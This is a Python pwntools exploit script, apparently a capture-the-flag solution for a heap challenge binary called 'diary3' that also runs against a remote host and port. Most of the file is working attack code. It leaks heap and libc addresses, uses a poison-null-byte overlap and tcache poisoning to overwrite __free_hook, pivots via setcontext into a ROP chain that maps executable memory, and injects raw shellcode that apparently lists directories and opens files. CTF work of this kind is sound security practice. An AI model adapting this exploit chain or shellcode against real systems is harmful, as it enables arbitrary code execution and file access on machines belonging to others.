#!/usr/bin/env python3
from pwn import *
import monkeyhex
import time
import argparse
import re
import os
from functools import partial
import logging

# Run with ipython3 -i solve.py -- DEBUG <one_gadget>

parser = argparse.ArgumentParser()
parser.add_argument("one_gadget", type=partial(int, base=0), nargs=argparse.REMAINDER)
argparse_args = parser.parse_args()

# context.log_level = 'debug'
context.terminal = ['gnome-terminal', '-e']

_CACHED_LIBC_PATH = None
def get_preloadable_libc(path=None, libc_paths=[]):
    global _CACHED_LIBC_PATH
    if _CACHED_LIBC_PATH is not None:
        return _CACHED_LIBC_PATH
    if path is None:
        path = os.getcwd()
    for root, dirs, files in os.walk(path):
        for f in files:
            # match common libc-2.31.so and libc.so.6 formats
            match = re.search(r'libc(\.so\.6|-\d+\.\d+\.so)', f)
            if match is not None:
                libc_paths.append(os.path.join(root, f))

    if len(libc_paths) > 0:
        return libc_paths[0]
    return None

# this variable will be filled in with an `ELF` object if
# there is a libc in the same directory as (or child directories of) the script
libc = None
script_directory = os.path.dirname(os.path.abspath(__file__))
LIBC_PATH = get_preloadable_libc(path=script_directory)
if libc is None and LIBC_PATH is not None:
    libc = ELF(LIBC_PATH)
    binsh_offset = libc.data.find(b'/bin/sh')
    if binsh_offset != -1:
        libc.sym['binsh'] = libc.offset_to_vaddr(binsh_offset)
    libc.sym['unlink_chunk'] = 0x00093760
    libc.sym['unlink_chunk_b1'] = 0x00093781

# writing gadgets up here because documenting them at the place they are used
# below is too disruptive to understand the flow correclty anyway
libc.sym['heap_pivot_gadget'] = 0x0150550
# https://blog.efiens.com/post/midas/heap-seccomp-rop/
# use gadget generated by  the following macro
# define clnt_control(cl,rq,in) ((*(cl)->cl_ops->cl_control)(cl,rq,in))
# called in getkeyserv_handle
# 0x150550: mov rdx, qword ptr [rdi + 8];
#           mov qword ptr [rsp], rax;
#           call qword ptr [rdx + 0x20];

libc.sym['setcontext_gadget'] = libc.address + 0x00055e35
# this gadget is from the function `setcontext`,
# which normally sets the context of registers to the state passed in
# through a `struct ucontext_t`. The struct is too large to be passed in, but
#
# MOV        RSP,qword ptr [RDX + 0xa0]
# MOV        RBX,qword ptr [RDX + 0x80]
# MOV        RBP,qword ptr [RDX + 0x78]
# MOV        R12,qword ptr [RDX + 0x48]
# MOV        R13,qword ptr [RDX + 0x50]
# MOV        R14,qword ptr [RDX + 0x58]
# MOV        R15,qword ptr [RDX + 0x60]
# MOV        RCX,qword ptr [RDX + 0xa8]
# PUSH       RCX
# MOV        RSI,qword ptr [RDX + 0x70]
# MOV        RDI,qword ptr [RDX + 0x68]
# MOV        RCX,qword ptr [RDX + 0x98]
# MOV        R8,qword ptr [RDX + 0x28]
# MOV        R9,qword ptr [RDX + 0x30]
# MOV        RDX,qword ptr [RDX + 0x88]
# XOR        EAX,EAX
# RET

fldenv_off = 0xe0
mxcsr_off = 0x1c0
# adjusted because rcx gets pushed onto the stack
first_gadget_off = 0xa8
rcx_off = 0x98
rdi_off = 0x68
rsi_off = 0x70
rdx_off = 0x88
rsp_off = 0xa0
rbx_off = 0x80
rbp_off = 0x78
r8_off = 0x28
r9_off = 0x30

binary = context.binary = ELF('diary3')


def attach_gdb(p, commands=None):
    """Template to run gdb with predefined commands on a process."""
    val = """
    c
    """ if commands is None else commands
    res = gdb.attach(p, val)
    pause()
    return res


def new_proc(start_gdb=False, val=None, force_unbuffered=False,
             skip_libc_preload=False,
             preload_libs=None):
    """Start a new process with predefined debug operations"""
    kwargs = {}
    kwargs["env"] = {}
    # if there is a libc in the current directory
    global LIBC_PATH
    if skip_libc_preload is False:
        if LIBC_PATH is not None:
            if preload_libs:
                preload_libs.append(LIBC_PATH)
            else:
                preload_libs = [LIBC_PATH]
    if preload_libs:
        cwd = os.getcwd()
        preload_libs = [os.path.join(cwd, i) if not i.startswith("/") else i
                        for i in preload_libs]
        ld_preload = kwargs['env'].get('LD_PRELOAD')
        if ld_preload:
            ld_preload = ld_preload.split(" ")
        else:
            ld_preload = []
        ld_preload.extend(preload_libs)
        kwargs['env']['LD_PRELOAD'] = " ".join(ld_preload)

    if force_unbuffered is True:
        kwargs['stdin'] = process.PTY
        kwargs['stdout'] = process.PTY

    p = process(binary.path, **kwargs)
    if start_gdb is True:
        attach_gdb(p, val)
    return p

def bnot(n, numbits=context.bits):
    return (1 << numbits) -1 -n

def align(val, align_to, numbits=context.bits):
    return val & bnot(align_to - 1, numbits)

def align_up(val, align_to, numbits=context.bits):
    aligned = align(val, align_to, numbits)
    if aligned < val:
        aligned += align_to
    return aligned

def batch(it, sz):
    length = len(it)
    for i in range(0, length, sz):
        yield it[i:i+sz]

def group_by_increment(iterable, group_incr):
    """
    Identify series of values that increment/decrement
    by the same amount, grouping them into lists.
    Useful for finding heap chunks next to eachother
    from large leaks
    """
    grouped = []
    current = [iterable[0]]
    for i in range(1, len(iterable)):
        curr_val = iterable[i]
        prev_val = current[-1]
        if (prev_val + group_incr) == curr_val:
            current.append(curr_val)
        else:
            grouped.append(current)
            current = [curr_val]
    if current:
        grouped.append(current)
    return grouped


def uniquish_char():
    for i in string.ascii_letters:
        yield i.encode()


SIZE_SZ = context.bytes
MALLOC_ALIGNMENT = SIZE_SZ*2
MALLOC_ALIGN_MASK = MALLOC_ALIGNMENT - 1
MIN_CHUNK_SIZE = SIZE_SZ*4
MINSIZE = (MIN_CHUNK_SIZE+MALLOC_ALIGN_MASK) & ~MALLOC_ALIGN_MASK
MAX_FAST_SIZE = 160

def calc_chunksize(x):
    if (x + SIZE_SZ + MALLOC_ALIGN_MASK) < MINSIZE:
        chunksize = MINSIZE
    else:
        chunksize = (x + SIZE_SZ + MALLOC_ALIGN_MASK) & ~MALLOC_ALIGN_MASK
    return chunksize


def calc_tcache_idx(x):
    CHUNKSIZE = calc_chunksize(x)
    IDX = (CHUNKSIZE - MINSIZE + MALLOC_ALIGNMENT - 1) // MALLOC_ALIGNMENT
    return IDX


CHAR_GEN = uniquish_char()

p = new_proc(context.log_level == logging.DEBUG,
             force_unbuffered=True,
             preload_libs=["libdealarm.so"]) if not args.REMOTE else remote('139.59.174.26', 31122)
# do leak / payload gen here
ALLOC_COUNT = 0


def write_page(content, size=None):
    global ALLOC_COUNT
    if size is None:
        size = len(content)
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'size: ', str(size).encode())
    p.sendafter(b'data: ', content)
    ALLOC_COUNT += 1


def edit_page(index, content):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'index: ', str(index).encode())
    p.sendafter(b'Input data: ', content)


def delete_page(index):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'index: ', str(index).encode())


def print_page(index):
    p.sendlineafter(b'> ', b'4')
    p.sendlineafter(b'index: ', str(index).encode())
    p.recvuntil(b'\n')
    data = p.recvuntil(b'\n')
    data_ind = data.find(b"data: ")
    if data_ind == -1:
        raise Exception("Unable to find b'data: ' in print_page output")
    return data[data_ind + len(b"data: "):].strip()


def edit_in_chunk_no_zeroes(index, chunk_data):
    # write necessary zeroes to the crafted chunk by editing the chunk
    # and adding a newline at the index where the zero needs to occur.
    # must be performed backwards to avoid overwriting previously
    # written zeroes. this is necessary because there is
    # a \x00 check in the edit_page function, but not in the
    # add_page function, but to perform the null byte overwrite
    # into another chunk's size, the edit_page function
    # has to be used.
    chunk_data_no_zeroes = chunk_data.replace(b'\x00', b'a')
    # this can trigger the null-byte overwrite
    # edit_page(index, chunk_data_no_zeroes)

    # edit in the zeroes because the edit_page function won't let you
    # write them in
    zero_inds = [i.start() for i in re.finditer(b'\x00', chunk_data)]
    zero_inds.sort(reverse=True)
    for i in zero_inds:
        edit_page(index, chunk_data_no_zeroes[:i] + b'\n')


num_tcache_chunks = 7

# alloc for TCACHE later
for i in range(num_tcache_chunks):
    write_page(next(CHAR_GEN)*(MIN_CHUNK_SIZE-8))

# fill tcache
for i in range(num_tcache_chunks):
    delete_page(i)

# Alloc a chunk that is in tcache but only overwrite one byte of the
# pointer to make the rest of the pointer technically a printable string
write_page(b'X')

heap_leak_raw = print_page(0)
# only able to leak 7 bytes of the heap pointer because of
# the one byte overwrite. Drop the 1 byte
heap_leak = u64(heap_leak_raw.ljust(8, b'\x00')) & ~0xff

# skip fancy heap gymnastics here to identify where the leak is
# because the heap is in a relatively clean state

# delete the page again to re-fill tcache
delete_page(0)

# there are now 7 chunks in the MIN_CHUNK_SIZE tcache list,
# and the MIN_CHUNK_SIZE fastbin is empty because nothing has been
# added to it yet

log.success("heap_leak %#x" % heap_leak)

ALLOC_COUNT = 0

# allocate chunks larger than fastbin size

# alloc for TCACHE later
for i in range(num_tcache_chunks):
    write_page(next(CHAR_GEN)*(MAX_FAST_SIZE+0x8))

# alloc 2 more chunks. 1 to be added to a freelist, the other
# to prevent chunk 1 from immediate coalescence into the top chunk.
# it is fine (and somewhat preferred) if it gets merged into the
# top, just as long as it still has fwd and bck pointers still
# written to it the next time an alloc is made that can't be
# fulfilled by tcache or the fastbin
for i in range(2):
    write_page(next(CHAR_GEN)*(MAX_FAST_SIZE+0x8))

# fill MAX_FAST_SIZE+8 tcache and make room for more active allocs
for i in range(ALLOC_COUNT):
    delete_page(i)

ALLOC_COUNT = 0

# re-empty MIN_CHUNK_SIZE tcache
for i in range(num_tcache_chunks):
    write_page(next(CHAR_GEN)*(MIN_CHUNK_SIZE-8))

# no more tcache chunks available for MIN_CHUNK_SIZE,
# and the fastbin for that size is empty
# The next allocated chunk will have to use (and split)
# a previously allocated chunk (there are none that are valid)
# or get something from the top chunk (this is what happens)
write_page(next(CHAR_GEN)*8)

libc_leak_raw = print_page(7)[8:]

libc_leak = u64(libc_leak_raw.ljust(8, b'\x00'))

log.success("libc leak %#x" % libc_leak)
# approximate libc address. __malloc_hook and main_arena are
# both global variables defined in the same code unit, so as long as
# they are within a page (0x1000) of eachother, the exact offset of
# main_arena doesn't matter. This does not always work, but does with
# this specific build of libc
# assert abs((libc.sym['__malloc_hook'] & 0xfff) - (libc_leak & 0xfff)) < 0x1000
libc.address = (libc_leak - libc.sym['__malloc_hook']) & ~0xfff
log.success("libc base %#x" % libc.address)

# refill MIN_CHUNK_SIZE tcache and free all remaining controlled chunks
# this will place the chunk used to leak libc on the MIN_CHUNK_SIZE freelist
for i in range(ALLOC_COUNT):
    delete_page(i)

ALLOC_COUNT = 0

# here comes the memory corruption
# alloc for tcache chunks again, this time for 0x100
for i in range(7):
    write_page(next(CHAR_GEN)*(0xf8))

num_tcache_chunks = ALLOC_COUNT
start_work_chunks = ALLOC_COUNT

# This could be calculated in a more dynamic way, but is too much effort
# because of the calculation to figure out which heap chunk was actually
# initially leaked.
# actual calc would be something like this
# (7*calc_chunksize(160+8)) + (7*calc_chunksize(0xf8)) + 0x20 + 0x20 + 0x20 + 0x10
# this is the address for the first chunk allocated with 0xf8 that is not
# in the tcache for that size
start_work_chunks_addr = ((7*calc_chunksize(160+8)) +  # 160+8 tcache
                          (7*calc_chunksize(0xf8)) +   # 160+8 tcache
                          0x20 +
                          0x20 +
                          0x20 + 0x10   # fastbin size chunk used to leak libc
                          + heap_leak)

# sizes are relatively arbitrary for a, b, and d
chunk_a_request_size = 0xf8
chunk_b_request_size = 0x38
chunk_c_request_size = 0xf8
chunk_d_request_size = 0x1f0
chunk_e_request_size = 0x1f0
chunk_a_addr = start_work_chunks_addr
chunk_b_addr = chunk_a_addr + calc_chunksize(chunk_a_request_size)
chunk_c_addr = chunk_b_addr + calc_chunksize(chunk_b_request_size)
chunk_d_addr = chunk_c_addr + calc_chunksize(chunk_c_request_size)
chunk_e_addr = chunk_d_addr + calc_chunksize(chunk_d_request_size)

# victim_chunk_prev_size = 0x20
# size of A (not yet allocated) with 0x20 at the end for room for the
fake_chunk_metadata_start_offset = align(0xb0, 0x10)
# fake chunk
fake_chunk_metadata_addr = align((chunk_a_addr + fake_chunk_metadata_start_offset), 0x10)
# adjust offset in case the actual address was misaligned
fake_chunk_metadata_start_offset = fake_chunk_metadata_addr - chunk_a_addr
fake_chunk_start_offset = fake_chunk_metadata_start_offset + 0x10

fake_chunk_addr = align_up(fake_chunk_metadata_addr + (2*context.bytes), 0x10)
victim_chunk_prev_size = ((chunk_c_addr) - fake_chunk_addr)

fake_chunk_size = victim_chunk_prev_size | 0
fake_chunk = b''
fake_chunk += p64(0)  # fake chunk prev_size (unused)
fake_chunk += p64(fake_chunk_size)  # fake chunk_size
fake_chunk += p64(fake_chunk_metadata_addr)  # fake chunk fwd
fake_chunk += p64(fake_chunk_metadata_addr)  # fake chunk bck
# chunk_a = fake_chunk.rjust(fake_chunk_metadata_start_offset, b'A')
# chunk_a = fake_chunk.rjust(chunk_a_request_size, b'A')
chunk_a = flat({
    fake_chunk_metadata_start_offset: fake_chunk,
}, length=chunk_a_request_size)

chunk_b = b''
chunk_b += p64(victim_chunk_prev_size)
chunk_b = chunk_b.rjust(chunk_b_request_size, b'B')

# need a no-zero representation so it can pass the null
# byte check for the edit_page function
chunk_b_no_zeroes = chunk_b.replace(b'\x00', b'a')

write_page(chunk_a)  # A
containing_chunk_ind = ALLOC_COUNT - 1   # A
write_page(chunk_b_no_zeroes)  # B
overwriting_chunk_ind = ALLOC_COUNT - 1  # B
write_page(next(CHAR_GEN)*(chunk_c_request_size))  # C
overlap_trigger_chunk_ind = ALLOC_COUNT - 1  # C

setcontext_payload = flat({
    0: b'READY: \x00',
    0x20: libc.sym['setcontext_gadget'],
    first_gadget_off: libc.sym['mmap'],
    rdi_off: 0x1000000,
    rsi_off: 0x8000,
    rdx_off: constants.PROT_READ | constants.PROT_WRITE | constants.PROT_EXEC,
    rcx_off: constants.MAP_FIXED | constants.MAP_PRIVATE | constants.MAP_ANONYMOUS,
    r8_off: 0,
    r9_off: 0,
    rsp_off: chunk_e_addr+8,  # add 8 so the first push doesn't go oob
}, length=chunk_d_request_size)

write_page(setcontext_payload)  # D to prevent consolidation
payload_chunk_ind = ALLOC_COUNT - 1  # D

r = ROP(libc)
ret = [k for k, v in r.gadgets.items() if v.insns == ['ret']][0]
pop_rdi = [k for k, v in r.gadgets.items() if v.insns == ['pop rdi', 'ret']][0]
pop_rdx_rsi = [k for k, v in r.gadgets.items() if v.insns == ['pop rdx', 'pop rsi', 'ret']][0]
ropchain_payload = flat({
    8: [
        pop_rdi,
        1,                    # stdout
        pop_rdx_rsi,
        len(b'READY: \x00'),  # length
        chunk_d_addr,  # buffer, points to b'READ: \x00'
        libc.sym['write'],

        pop_rdi,
        0,   # file descriptor
        pop_rdx_rsi,
        0x8000,  # length
        0x1000000,  # buffer
        libc.sym['read'],

        0x1000000,  # buffer
    ]

}, length=chunk_e_request_size)

write_page(ropchain_payload)  # E
fake_stack_ind = ALLOC_COUNT - 1  # E

# fill tcache for both chunk sizes
for i in range(num_tcache_chunks):
    delete_page(i)

# overwrite with poison null
edit_page(overwriting_chunk_ind, chunk_b_no_zeroes)

edit_in_chunk_no_zeroes(overwriting_chunk_ind, chunk_b)

log.debug("chunk_a_addr %#x" % chunk_a_addr)
log.debug("fake_chunk_addr %#x" % fake_chunk_addr)
log.debug("fake chunk size %#x" % fake_chunk_size)
log.debug("victim_chunk_prev_size %#x" % victim_chunk_prev_size)
log.debug("chunk_b_addr %#x" % chunk_b_addr)
log.debug("chunk_c_addr %#x" % chunk_c_addr)
log.debug("chunk_d_addr %#x" % chunk_d_addr)

# delete C, linking in the fake chunk into a freelist (unsure which)
delete_page(overlap_trigger_chunk_ind)

chunk_b_size_offset = (chunk_a_request_size - fake_chunk_start_offset)
# because allocations in this program are based on the data sent in
# rather than being unrelated, the data allocated here has to
# rewrite some of the data that would be overwritten from chunk b
# -9 to avoid retriggering the bug on chunk C
fake_chunk_alloc_cont = flat({
    chunk_b_size_offset: calc_chunksize(chunk_b_request_size) | 1,
}, length=(fake_chunk_size-9))

# allocate the fake chunk
write_page(fake_chunk_alloc_cont)

log.success("Have overlapping chunks")

# before this commit, 77dc0d8643aa99c92bf671352b0a8adde705896f
# no padding necessary for tcache poison
# allocate another chunk of the same size as chunk_b for padding
write_page(next(CHAR_GEN)*(chunk_b_request_size))
# delete padding chunk to add it to the
delete_page(1)

# delete B, which lies within the fake chunk
delete_page(overwriting_chunk_ind)

chunk_b_fd_offset = chunk_b_size_offset+8
chunk_b_bk_offset = chunk_b_size_offset+16
# should document this later, but it is the size of the standard
# first chunk on the heap (malloc implementation controlled) +
# the remainder of the chunks between the leak and the base
heap_base = heap_leak - 0x6f0

# There might be an alternative to using `heap_base` for the `bk` pointer,
# but that is what is usually there in unaltered malloc
fake_chunk_overwrite_b = flat({
    chunk_b_size_offset: calc_chunksize(chunk_b_request_size) | 1,
    chunk_b_fd_offset: libc.sym['__free_hook'],
    chunk_b_bk_offset: heap_base,
}, length=(fake_chunk_size-9))

# edit in the zeroes because the edit_page function won't let you
# write them in
edit_in_chunk_no_zeroes(0, fake_chunk_overwrite_b)

# re-allocate B, unlinking it from its tcache list
# also links the write address into the tcache list
write_page(next(CHAR_GEN)*(chunk_b_request_size))

log.debug("Doing arbitrary write")
# allocate again to get the write address back from malloc
free_hook_overwrite_payload = flat({
    0: libc.sym['heap_pivot_gadget']
}, length=chunk_b_request_size)
write_page(free_hook_overwrite_payload)
log.debug("Arbitrary write to %#x done" % libc.sym['__free_hook'])

# payload that will initially be called with free
trigger_payload = flat({
    8: chunk_d_addr,
})
write_page(trigger_payload)

# start heap_pivot_gadget, which jumps into
# `setcontext_gadget`, which starts the ropchain
delete_page(3)

time.sleep(0.5)
sc_asm = shellcraft.mmap(0,
                         0x8000,
                         constants.PROT_READ | constants.PROT_WRITE,
                         constants.MAP_PRIVATE | constants.MAP_ANON, 0, 0)
sc_asm += 'add rax, 0x7fe0\n'
sc_asm += 'mov rsp, rax\n'
# sc_asm += shellcraft.execveat(constants.AT_FDCWD, b'/bin/sh\x00', 0, 0, 0)
sc = asm(sc_asm)
sc += bytes([
  0x55, 0x41, 0x57, 0x41, 0x56, 0x41, 0x55, 0x41, 0x54, 0x53, 0x48, 0x81,
  0xec, 0x18, 0x05, 0x00, 0x00, 0x31, 0xc0, 0xc6, 0x44, 0x04, 0x10, 0x00,
  0x48, 0xff, 0xc0, 0x48, 0x3d, 0x00, 0x04, 0x00, 0x00, 0x75, 0xf0, 0x48,
  0x8d, 0x15, 0x84, 0x01, 0x00, 0x00, 0xbf, 0x01, 0x01, 0x00, 0x00, 0xbe,
  0x9c, 0xff, 0xff, 0xff, 0xb9, 0x00, 0x00, 0x01, 0x00, 0x45, 0x31, 0xc0,
  0x31, 0xc0, 0xe8, 0x51, 0x01, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x08,
  0x85, 0xc0, 0x0f, 0x88, 0xfd, 0x00, 0x00, 0x00, 0x4c, 0x8d, 0x25, 0x62,
  0x01, 0x00, 0x00, 0x4c, 0x8d, 0xac, 0x24, 0x10, 0x04, 0x00, 0x00, 0xbf,
  0x4e, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x74, 0x24, 0x08, 0x48, 0x8d, 0x54,
  0x24, 0x10, 0xb9, 0x00, 0x04, 0x00, 0x00, 0x31, 0xc0, 0xe8, 0x1a, 0x01,
  0x00, 0x00, 0x48, 0x89, 0xc3, 0x83, 0xfb, 0xff, 0x0f, 0x84, 0xda, 0x00,
  0x00, 0x00, 0x85, 0xdb, 0x0f, 0x84, 0xef, 0x00, 0x00, 0x00, 0x7e, 0xcf,
  0x45, 0x31, 0xff, 0x44, 0x89, 0xf8, 0x4c, 0x8d, 0x34, 0x04, 0x49, 0x83,
  0xc6, 0x10, 0x48, 0x8d, 0x2c, 0x04, 0x48, 0x83, 0xc5, 0x22, 0x48, 0x8d,
  0x4c, 0x24, 0x22, 0x48, 0x01, 0xc8, 0x48, 0xc7, 0xc1, 0xff, 0xff, 0xff,
  0xff, 0x80, 0x7c, 0x08, 0x01, 0x00, 0x48, 0x8d, 0x49, 0x01, 0x75, 0xf5,
  0xbf, 0x01, 0x00, 0x00, 0x00, 0xbe, 0x01, 0x00, 0x00, 0x00, 0x48, 0x89,
  0xea, 0x31, 0xc0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0xbf, 0x01, 0x00, 0x00,
  0x00, 0xbe, 0x01, 0x00, 0x00, 0x00, 0x4c, 0x89, 0xe2, 0xb9, 0x01, 0x00,
  0x00, 0x00, 0x31, 0xc0, 0xe8, 0xa7, 0x00, 0x00, 0x00, 0x41, 0x0f, 0xb7,
  0x46, 0x10, 0x41, 0x01, 0xc7, 0xbf, 0x01, 0x01, 0x00, 0x00, 0xbe, 0x9c,
  0xff, 0xff, 0xff, 0x48, 0x89, 0xea, 0x31, 0xc9, 0x45, 0x31, 0xc0, 0x31,
  0xc0, 0xe8, 0x86, 0x00, 0x00, 0x00, 0x85, 0xc0, 0x78, 0x2d, 0xb9, 0x00,
  0x01, 0x00, 0x00, 0x31, 0xff, 0x89, 0xc6, 0x4c, 0x89, 0xea, 0x31, 0xc0,
  0xe8, 0x6f, 0x00, 0x00, 0x00, 0x85, 0xc0, 0x78, 0x16, 0xbf, 0x01, 0x00,
  0x00, 0x00, 0xbe, 0x01, 0x00, 0x00, 0x00, 0x4c, 0x89, 0xea, 0x89, 0xc1,
  0x31, 0xc0, 0xe8, 0x55, 0x00, 0x00, 0x00, 0x41, 0x39, 0xdf, 0x0f, 0x8c,
  0x4b, 0xff, 0xff, 0xff, 0xe9, 0x12, 0xff, 0xff, 0xff, 0x48, 0x8d, 0x15,
  0x67, 0x00, 0x00, 0x00, 0xbf, 0x01, 0x00, 0x00, 0x00, 0xb9, 0x04, 0x00,
  0x00, 0x00, 0xeb, 0x11, 0x48, 0x8d, 0x15, 0x49, 0x00, 0x00, 0x00, 0xbf,
  0x01, 0x00, 0x00, 0x00, 0xb9, 0x08, 0x00, 0x00, 0x00, 0xbe, 0x01, 0x00,
  0x00, 0x00, 0x31, 0xc0, 0xe8, 0x17, 0x00, 0x00, 0x00, 0x31, 0xc0, 0x48,
  0x81, 0xc4, 0x18, 0x05, 0x00, 0x00, 0x5b, 0x41, 0x5c, 0x41, 0x5d, 0x41,
  0x5e, 0x41, 0x5f, 0x5d, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0xf8, 0x48,
  0x89, 0xf7, 0x48, 0x89, 0xd6, 0x48, 0x89, 0xca, 0x4d, 0x89, 0xc2, 0x4d,
  0x89, 0xc8, 0x4c, 0x8b, 0x4c, 0x24, 0x08, 0x0f, 0x05, 0xc3, 0x2e, 0x00,
  0x67, 0x65, 0x74, 0x64, 0x65, 0x6e, 0x74, 0x73, 0x00, 0x0a, 0x00, 0x6f,
  0x70, 0x65, 0x6e, 0x00
])

sc = sc.replace(b'DDDDDDDD', p64(libc.sym['__realloc_hook']))
sc = sc.replace(b'UUUUUUUU', p64(libc.sym['__free_hook']))

p.sendafter(b'READY: ', sc)

time.sleep(0.5)

a = b''
try:
    while p.can_recv():
        a += p.recv()
except:
    pass

# can't safely print raw
print(a)
